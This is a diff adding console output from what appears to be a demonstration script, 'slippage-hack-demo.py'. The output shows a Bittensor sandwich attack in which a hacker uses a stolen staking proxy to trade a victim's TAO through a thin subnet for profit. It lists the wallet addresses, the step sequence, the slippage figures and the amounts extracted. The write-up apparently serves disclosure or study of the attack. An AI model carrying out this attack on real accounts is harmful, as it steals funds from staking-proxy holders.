@@ -69,6 +69,74 @@ The attacker leg uses a fixed `HACKER_STAKE_TAO` (10 τ in the copy below) so ca
 slippage-hack-demo.py
 ```
 ```
+Hacker wallet:  5G4mxrN8msvc4jjwp7xoBrtAejTfAMLCMTFGCivY5inmySbq
+Stolen proxy:   5F1TCdVcRWLYyKiS2kF2nBZ21EwQDDFr8hEqrDhRL6YvdtgQ
+Victim account: 5ECaCSR1tEzcF6yDiribP1JVsw2ZTepZ1ZPy7xgk7yoUv69b
+
+Staking proxy confirmed: victim 5ECaCSR1tEzc... → delegate 5F1TCdVcRWLY...
+
+=== INITIAL STATE ===
+  Hacker free TAO: τ1,304.232753676
+  victim free TAO: τ45.698728115
+  Hacker stake (fixed): 10.0 τ
+  Victim stake (max this round): 45.198728 τ
+
+Target subnet: netuid 315
+  Picker: top 50 by price among subnets with tao_in ≥ 451.98728115 τ (10.0× sizing stake); then max slippage @ 45.198728 τ.
+  TAO reserve:   τ729.825184782
+  Alpha reserve: 584,234.912705817श
+  Price:         τ0.001208481
+  Est. slippage @ 10.0 τ (hacker leg): 4.57%
+  Est. slippage @ 45.198728 τ (victim leg): 8.90%
+
+Target hotkey: 5CJU4mP5kwxWCDFZ...
+
+=== UNLOCK COLDKEYS (you will be prompted for each password below) ===
+
+1) HACKER wallet — signs attacker add_stake / unstake
+   Wallet name: 'PracticeKey!'
+   Coldkey SS58: 5G4mxrN8msvc4jjwp7xoBrtAejTfAMLCMTFGCivY5inmySbq
+Enter your password:
+Decrypting...
+
+2) STOLEN PROXY wallet — signs proxy() extrinsics for the victim
+   Wallet name: 'zingo'
+   Coldkey SS58: 5F1TCdVcRWLYyKiS2kF2nBZ21EwQDDFr8hEqrDhRL6YvdtgQ
+Enter your password:
+Decrypting...
+
+Coldkeys unlocked. Starting rounds.
+
+============================================================
+  ROUND 1/1
+============================================================
+  Hacker leg: 10.0 τ  |  Victim leg: 45.198728 τ (max; leaves ≥0.5 τ free)
+
+  [1] Hacker stakes 10.0 TAO into subnet 315...
+      OK
+  [2] Proxy: stake 45.198728 TAO from victim into subnet 315...
+      OK — alpha price pumped
+  [3] Hacker unstakes 8,148.888198512श alpha (sells at elevated price)...
+      OK — profit captured
+  [4] Proxy: unstake 34,024.993427745श alpha from victim (depressed price)...
+      OK — victim gets less TAO back
+
+  Round 1 result:
+    Hacker: τ1,304.232753676 → τ1,305.583648293  (Δ +1.350895 TAO)
+    Victim: τ45.698728115 → τ44.293819013  (Δ -1.404909 TAO)
+    Victim free TAO lost: 1.404909  |  Hacker free TAO gained: 1.350895  |  Gap (fees / pool / rounding): 0.054014 TAO
+
+
+============================================================
+  FINAL RESULTS
+============================================================
+  Hacker: τ1,304.232753676 → τ1,305.583648293  (net +1.350895 TAO)
+  Victim: τ45.698728115 → τ44.293819013  (net -1.404909 TAO)
+
+  Hacker extracted: 1.350895 TAO
+  Victim lost:      1.404909 TAO
+  Gap (not to hacker): 0.054014 TAO
+  Extraction rate:  3.07% of victim's starting balance
 ```
 
 
